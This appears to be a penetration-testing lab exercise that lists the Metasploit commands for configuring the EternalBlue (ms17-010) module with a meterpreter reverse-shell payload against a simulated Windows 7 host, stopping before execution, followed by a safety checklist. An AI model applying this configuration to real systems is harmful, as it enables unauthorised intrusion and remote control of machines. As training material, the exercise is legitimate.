Scenario

Simulated target: Windows 7 lab host

Objective: identify a suitable ms17-010 module and record configuration without executing the exploit.

msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.101
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
set LHOST 192.168.1.5
set LPORT 4444
# STOP: document choices; do NOT run 'exploit'
Deliverable
A short report listing the module, options set, chosen payload, listener settings, and why this payload fits the lab environment. Include notes about any module 'check' output if available.
Safety checklist
  • Confirm written authorization and scope.
  • Use isolated lab targets, not production addresses.
  • Prefer non-destructive 'check' when available.
  • Record every command and configuration for review.
Key Takeaway

Practice reconnaissance and configuration in a lab. Documentation and safety checks are as important as technical steps.
